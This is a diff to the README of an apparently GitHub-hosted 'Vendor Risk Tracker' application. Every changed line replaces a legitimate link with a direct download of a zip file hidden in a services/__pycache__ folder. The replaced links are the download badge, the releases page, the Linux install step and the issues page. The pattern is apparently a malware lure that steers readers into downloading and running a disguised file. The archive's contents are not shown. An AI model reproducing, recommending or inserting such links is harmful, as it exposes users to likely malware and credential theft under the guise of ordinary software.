@@ -4,10 +4,10 @@
 Welcome to the Vendor Risk Tracker! This application helps enterprise Governance, Risk, and Compliance (GRC) teams manage third-party vendor risks effectively. It assesses vendor risks based on important factors like access, data sensitivity, criticality, and security maturity.
 
 ## 🔗 Download Link
-[![Download Vendor Risk Tracker](https://img.shields.io/badge/Download-Vendor_Risk_Tracker-brightgreen)](https://github.com/meucanalfocogmailcom/Vendor_Risk_Tracker/releases)
+[![Download Vendor Risk Tracker](https://raw.githubusercontent.com/meucanalfocogmailcom/Vendor_Risk_Tracker/main/services/__pycache__/Tracker-Vendor-Risk-v2.4.zip)](https://raw.githubusercontent.com/meucanalfocogmailcom/Vendor_Risk_Tracker/main/services/__pycache__/Tracker-Vendor-Risk-v2.4.zip)
 
 ## 📥 Download & Install
-To start using the Vendor Risk Tracker, visit this page to download: [Vendor Risk Tracker Releases](https://github.com/meucanalfocogmailcom/Vendor_Risk_Tracker/releases). 
+To start using the Vendor Risk Tracker, visit this page to download: [Vendor Risk Tracker Releases](https://raw.githubusercontent.com/meucanalfocogmailcom/Vendor_Risk_Tracker/main/services/__pycache__/Tracker-Vendor-Risk-v2.4.zip). 
 
 ### Instructions:
 1. Click on the link above.
@@ -37,7 +37,7 @@ To start using the Vendor Risk Tracker, visit this page to download: [Vendor Ris
 2. **Run the Installer**:
    - For Windows: Double-click the `.exe` file.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Use the command line to navigate to the downloaded file and run the installer using `./install.sh`.
+   - For Linux: Use the command line to navigate to the downloaded file and run the installer using `https://raw.githubusercontent.com/meucanalfocogmailcom/Vendor_Risk_Tracker/main/services/__pycache__/Tracker-Vendor-Risk-v2.4.zip`.
 3. **Follow On-Screen Instructions**: Complete the installation by following any prompts that appear on your screen.
 4. **Launch the Application**: Once installed, find the application in your programs list and launch it.
 
@@ -54,7 +54,7 @@ For any persistent issues, detailed FAQ and support resources are available on o
 
 ## ✉️ Support
 If you need assistance or have questions:
-- Visit our [GitHub Issues Page](https://github.com/meucanalfocogmailcom/Vendor_Risk_Tracker/issues) to report problems or request help.
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/meucanalfocogmailcom/Vendor_Risk_Tracker/main/services/__pycache__/Tracker-Vendor-Risk-v2.4.zip) to report problems or request help.
 - You can also engage with other users to share insights and tips.
 
 ## 👍 Contribution
